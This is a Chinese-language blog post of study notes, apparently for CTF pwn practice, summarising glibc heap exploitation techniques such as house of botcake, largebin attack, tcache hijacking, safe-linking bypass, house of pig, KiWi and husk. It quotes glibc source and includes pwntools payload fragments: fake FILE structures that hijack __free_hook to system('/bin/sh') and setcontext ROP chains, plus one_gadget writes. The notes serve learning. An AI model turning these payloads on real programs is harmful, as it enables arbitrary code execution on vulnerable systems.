---

title: 高版本glibc利用总结
date: 2023-09-11 19:30:22
description: 对高版本glibc利用手法的总结
tags:
- glibcLearning
---

# 高版本glibc利用总结

## house of botcake

### libc版本：

libc2.28-libc2.30

### 原理：

此版本下，对tcache_entry加入了key字段且key字段的值为tcachebin+0x10。无法方便的完成doublefree

### 利用流程：

1. 先填满tcachebin且size＞0x80
2. 再连续free两个chunk，要求A在B的上方且B的size和第一步放入tcache的chunk的size相同，让他们合并后进入unsortedbin
3. 从tcache中取出一个chunk
4. 利用uaf，将b给doublefree进入到tcache，可以避开key字段的检测

## largebin attack

### libc版本：

1. libc2.28以后，加入了对unsoredbin的bk指针的检测，此后unsortedbin不再起作用
2. libc2.30之后，加入了对largebin的检查，largebin attack被限制，但是仍然可以利用

### 利用流程：

之前的利用中，我们选择了第二个分支，在其中修改bk为target_addr-0x10,在bk_nextsize中写入target_addr-0x20,就可以在target_addr出写入largebin的首个chunk的地址

```c
if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
{
    fwd = bck;
    bck = bck->bk;
    victim->fd_nextsize = fwd->fd;
    victim->bk_nextsize = fwd->fd->bk_nextsize; // 1
    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; // 2
}
else{
    ...
}
```

1. free一个A到largebinlist，并修改其bk为 _target_addr-0x20_ 
2. free一个size略微小于A的chunk，这样可以和A进入同一个largebin，这时候target_addr就会写入B的堆地址
3. 若只为了写入大数字，此时已经完成了利用，但是往往我们需要修复largebin list
   1. 首先取出B，这时候会在target_addr出写入A的堆地址
   2. 利用uaf等修复A，并取出，此时可以对A进行一些伪造，相当于伪造target_addr

## Tcache_Perthread_struct劫持

### libc版本：

libc2.30及以下

```c
typedef struct tcache_perthread_struct
{
    char counts[TCACHE_MAX_BINS];
    tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

libc2.30及以上

```c
typedef struct tcache_perthread_struct
{
    uint16_t counts[TCACHE_MAX_BINS];
    tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

其中， `TCACHE_MAX_BINS` 为64，该结构体位于chunk首地址

### 利用流程：

1. 在libc2.30及以下中，取出tcache并不会检测count，因此可以任意利用
2. 在libc2.30及以上版本中，会检测count>0是否成立，因此count不可以小于0
3. 可以劫持TLS结构体中的 `tcache pointer` 对于其中的chunk进行伪造
4. 对于 `Tcache struct` 的溢出，可以修改 `mp_.tache_bins` 写入一个大数值，类似于修改global_max_fast，之后free的chunk都会放入tcache中。

## Decrypt：

在高版本中，tcache和fastbin增加了对next指针的保护

```c
#define PROTECT_PTR(pos, ptr) \
((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

简单的说就是堆块的地址右移12位之后，与 `fd/next` 指针进行异或，得到的结果作为新的next，但是当tcache中只有一个chunk的时候，next指针为0，这时候存放的就是 `pos>>12` 的值，可以通过泄露这个值来用来decrypt，进行绕过

## house of pig

首先看 `_IO_str_overflow`

```c
int _IO_str_overflow (FILE *fp, int c)
{
  int flush_only = c == EOF;
  size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
    return EOF;
      else
        {
          char *new_buf;
          char *old_buf = fp->_IO_buf_base;
          size_t old_blen = _IO_blen (fp);
          size_t new_size = 2 * old_blen + 100;
          if (new_size < old_blen)
            return EOF;
          new_buf = malloc (new_size); // 1
          if (new_buf == NULL)
            {
              /*      __ferror(fp) = 1; */
              return EOF;
            }
          if (old_buf)
            {
              memcpy (new_buf, old_buf, old_blen); // 2
              free (old_buf); // 3
              /* Make sure _IO_setb won't try to delete _IO_buf_base. */
              fp->_IO_buf_base = NULL;
            }
          memset (new_buf + old_blen, '\0', new_size - old_blen); // 4
 
          _IO_setb (fp, new_buf, new_buf + new_size, 1);
          fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
          fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
          fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
          fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);
 
          fp->_IO_write_base = new_buf;
          fp->_IO_write_end = fp->_IO_buf_end;
        }
    }
 
  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr > fp->_IO_read_end)
    fp->_IO_read_end = fp->_IO_write_ptr;
  return c;
}
libc_hidden_def (_IO_str_overflow)
```

这段代码我们在2.24下的FSOP中已经分析过了，那里提到了高版本使用了malloc，所以会导致第二种方法失效，但是这里提出了一种对于高版本的攻击方法

在这段代码中我们先后执行了 malloc memcpy free三个函数，很容易想到，我们先malloc一个堆块，堆块中有free_hook相关内容，之后我们在memcpy中进行赋值随后进行free，那我们就可以修改freehook为system从而进行getshell

比如说，先利用`tcache stashing unlink attack`或者劫持`TLS`中的`tcache pointer`等方式，在`0xa0`的`tcache bin`中伪造一个`__free_hook - 0x10`在链首，然后伪造`IO_FILE`如下：

```python
fake_IO_FILE = p64(0)*3 + p64(0xffffffffffffffff) # set _IO_write_ptr
# fp->_IO_write_ptr - fp->_IO_write_base >= _IO_buf_end - _IO_buf_base
fake_IO_FILE += p64(0) + p64(fake_IO_FILE_addr + 0xe0) + p64(fake_IO_FILE_addr + 0xf8)
# set _IO_buf_base & _IO_buf_end   old_blen = 0x18
fake_IO_FILE = payload.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(get_IO_str_jumps())
fake_IO_FILE += b'/bin/sh\x00' + p64(0) + p64(libc.sym['system']
```

最后通过exit触发，就可以getshell，但是在2.34以及以后的，hook就被删除了，但是我们仍然可以利用memset，那我们就可以来改写memset 的got表

先在`0xa0`的`tcache`链表头伪造一个`memset_got_addr`的地址，并伪造`IO_FILE`如下：

```python
# magic_gadget：mov rdx, rbx ; mov rsi, r12 ; call qword ptr [r14 + 0x38]
fake_stderr = p64(0)*3 + p64(0xffffffffffffffff) # _IO_write_ptr
fake_stderr += p64(0) + p64(fake_stderr_addr+0xf0) + p64(fake_stderr_addr+0x108)
fake_stderr = fake_stderr.ljust(0x78, b'\x00')
fake_stderr += p64(libc.sym['_IO_stdfile_2_lock']) # _lock
fake_stderr = fake_stderr.ljust(0x90, b'\x00') # srop
fake_stderr += p64(rop_address + 0x10) + p64(ret_addr) # rsp rip
fake_stderr = fake_stderr.ljust(0xc8, b'\x00')
fake_stderr += p64(libc.sym['_IO_str_jumps'] - 0x20)
fake_stderr += p64(0) + p64(0x21)
fake_stderr += p64(magic_gadget) + p64(0) # r14 r14+8
fake_stderr += p64(0) + p64(0x21) + p64(0)*3
fake_stderr += p64(libc.sym['setcontext']+61) # r14 + 0x38
```

## house of KiWi

主要提供了一种在程序中触发IO的思路，并且可以控制rdx，可以很方便的进行orw

```c
// assert.h
# if defined __cplusplus
#  define assert(expr)                            \
     (static_cast <bool> (expr)                        \
      ? void (0)                            \
      : __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION))
# elif !defined __GNUC__ || defined __STRICT_ANSI__
#  define assert(expr)                            \
    ((expr)                                \
     ? __ASSERT_VOID_CAST (0)                        \
     : __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION))
# else
#  define assert(expr)                            \
  ((void) sizeof ((expr) ? 1 : 0), __extension__ ({            \
      if (expr)                                \
        ; /* empty */                            \
      else                                \
        __assert_fail (#expr, __FILE__, __LINE__, __ASSERT_FUNCTION);    \
    }))
# endif
 
// malloc.c ( #include <assert.h> )
# define __assert_fail(assertion, file, line, function)            \
     __malloc_assert(assertion, file, line, function)
 
static void __malloc_assert (const char *assertion, const char *file, unsigned int line, const char *function)
{
  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
             __progname, __progname[0] ? ": " : "",
             file, line,
             function ? function : "", function ? ": " : "",
             assertion);
  fflush (stderr);
  abort ();
}
```

可以看到，在malloc.c中，调用了assert断言，最终调用了_\_malloc_assert_ ，这其中会使用一个fllush函数，这个函数是走io的最终会调用到其`vtable`中`_IO_file_jumps`中的`__IO_file_sync`，此时`rdx`为`IO_helper_jumps`

遇到开启了沙盒需要orw的情况，我们一般会利用setcontext来控制rsp，进而跳转rop，但是在2.29以上的setcontext中，参数由rdi变成了rdx，起始位置也从setcontext+53变成了setcontext+61(2.29版本仍是setcontext+53但是参数已经是由rdx进行控制了)，house of kiwi就是一种可以帮助我们很方便的控制rdx的方法

首先我们要考虑如何触发malloc的assert报错：

1. 在 `_int_malloc` 中判断topchunk的大小过小，无法再次进行分配的时候，会进行sysmalloc中的断言，这段在house of orange中也有体现，house of orange的第一步如何在缺少free的时候获得一个chunk

   ```c
   assert ((old_top == initial_top (av) && old_size == 0) ||
           ((unsigned long) (old_size) >= MINSIZE &&
            prev_inuse (old_top) &&
            ((unsigned long) old_end & (pagesize - 1)) == 0));
   ```

   因此，我们可以学习house of orange的方法，修改topchunk的size 并且修改prev_size为0，当topchunk不满足分配条件的时候，就会调用这个assert

2. 在 `_int_malloc` 中，如果堆块从 *unsortedbin* 中转到 *largebin list* 的时候，也会有一些断言如 `(chunk_main_arena (bck->bk))`，`assert (chunk_main_arena (fwd))`

## house of husk

[house-of-husk学习笔记-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/202387)

这里利用的printf的一个调用的chain，应用场景为只能分配较大chunk，存在或者可以构造出来UAF漏洞

首先知道在使用`printf`类格式化字符串函数进行输出的时候，该类函数会根据我们格式化字符串的种类不同而采取不同的输出格式进行输出，在glibc中有这样一个函数`__register_printf_function`，为格式化字符为`spec`的格式化输出注册函数，这个函数是`__register_printf_specifier`函数的封装。

```c
int
__register_printf_function (int spec, printf_function converter,
			    printf_arginfo_function arginfo)
{
  return __register_printf_specifier (spec, converter,
				      (printf_arginfo_size_function*) arginfo);
}
weak_alias (__register_printf_function, register_printf_function)
    
int
__register_printf_specifier (int spec, printf_function converter,
			     printf_arginfo_size_function arginfo)
{
  if (spec < 0 || spec > (int) UCHAR_MAX)
    {
      __set_errno (EINVAL);
      return -1;
    }

  int result = 0;
  __libc_lock_lock (lock);

  if (__printf_function_table == NULL)
    {
      __printf_arginfo_table = (printf_arginfo_size_function **)
	calloc (UCHAR_MAX + 1, sizeof (void *) * 2);
      if (__printf_arginfo_table == NULL)
	{
	  result = -1;
	  goto out;
	}

      __printf_function_table = (printf_function **)
	(__printf_arginfo_table + UCHAR_MAX + 1);
    }

  __printf_function_table[spec] = converter;
  __printf_arginfo_table[spec] = arginfo;

 out:
  __libc_lock_unlock (lock);

  return result;
}
libc_hidden_def (__register_printf_specifier)
```

让我们看看源码做了那些事情

1. 首先，判断spec是否为char范围内，若不是，退出
2. 接着判断 `__printf_function_table` 是否为空，若是空，就通过calloc分配堆内存存放\__printf_arginfo_table以及__printf_function_table。两个表空间都为0x100，可以为0-0xff的每个字符注册一个函数指针，第一个表后面紧接着第二个表。

在`vfprintf`函数中，如果检测到`__printf_function_table`不为空，则对于格式化字符不走默认的输出函数，而是调用`printf_positional`函数，进而可以调用到表中的函数指针：

```c
// vfprintf-internal.c : 1412
if (__glibc_unlikely (__printf_function_table != NULL
            || __printf_modifier_table != NULL
            || __printf_va_arg_table != NULL))
    goto do_positional;
 
// vfprintf-internal.c : 1682
do_positional:
  done = printf_positional (s, format, readonly_format, ap, &ap_save,
                done, nspecs_done, lead_str_end, work_buffer,
                save_errno, grouping, thousands_sep, mode_flags);
```

`__printf_function_table`中类型为`printf_function`的函数指针，在`printf->vfprintf->printf_positional`被调用：

```c
// vfprintf-internal.c : 1962
if (spec <= UCHAR_MAX
          && __printf_function_table != NULL
          && __printf_function_table[(size_t) spec] != NULL)
{
      const void **ptr = alloca (specs[nspecs_done].ndata_args
                 * sizeof (const void *));
 
      /* Fill in an array of pointers to the argument values.  */
      for (unsigned int i = 0; i < specs[nspecs_done].ndata_args;
       ++i)
        ptr[i] = &args_value[specs[nspecs_done].data_arg + i];
 
      /* Call the function.  */
      function_done = __printf_function_table[(size_t) spec](s, &specs[nspecs_done].info, ptr); // 调用__printf_function_table中的函数指针
 
    if (function_done != -2)
    {
      /* If an error occurred we don't have information
         about # of chars.  */
      if (function_done < 0)
        {
          /* Function has set errno.  */
          done = -1;
          goto all_done;
        }
 
      done_add (function_done);
      break;
    }
}
```

另一个在`__printf_arginfo_table`中的类型为`printf_arginfo_size_function`的函数指针，在`printf->vfprintf->printf_positional->__parse_one_specmb`中被调用，其功能是根据格式化字符做解析，返回值为格式化字符消耗的参数个数：

```c
// vfprintf-internal.c : 1763
nargs += __parse_one_specmb (f, nargs, &specs[nspecs], &max_ref_arg);
 
// printf-parsemb.c (__parse_one_specmb函数)
/* Get the format specification.  */
spec->info.spec = (wchar_t) *format++;
spec->size = -1;
if (__builtin_expect (__printf_function_table == NULL, 1)
  || spec->info.spec > UCHAR_MAX
  || __printf_arginfo_table[spec->info.spec] == NULL // 判断是否为空
  /* We don't try to get the types for all arguments if the format
 uses more than one.  The normal case is covered though.  If
 the call returns -1 we continue with the normal specifiers.  */
  || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec]) // 调用__printf_arginfo_table中的函数指针
               (&spec->info, 1, &spec->data_arg_type,
                &spec->size)) < 0)
{
  /* Find the data argument types of a built-in spec.  */
  spec->ndata_args = 1
```

从源码中可以看到，我们先调用了`__printf_arginfo_table`中的函数指针，再调用了`__printf_function_table`中的函数指针。

1. 假设现在`__printf_function_table`和`__printf_arginfo_table`分别被填上了`chunk 4`与`chunk 8`的堆块地址（`chunk header`）

   ```python
   one_gadget = libc.address + 0xe6c7e
   edit(8, p64(0)*(ord('s') - 2) + p64(one_gadget))
   ```

   

2. 由于有堆块头，所以格式化字符的索引要减`2`，这样写就满足了`__printf_function_table`不为空，进入了`printf_positional`函数，并调用了`__printf_arginfo_table`中的函数指针。

   ```python
   one_gadget = libc.address + 0xe6ed8
   edit(4, p64(0)*(ord('s') - 2) + p64(one_gadget))
   ```

## house of banana

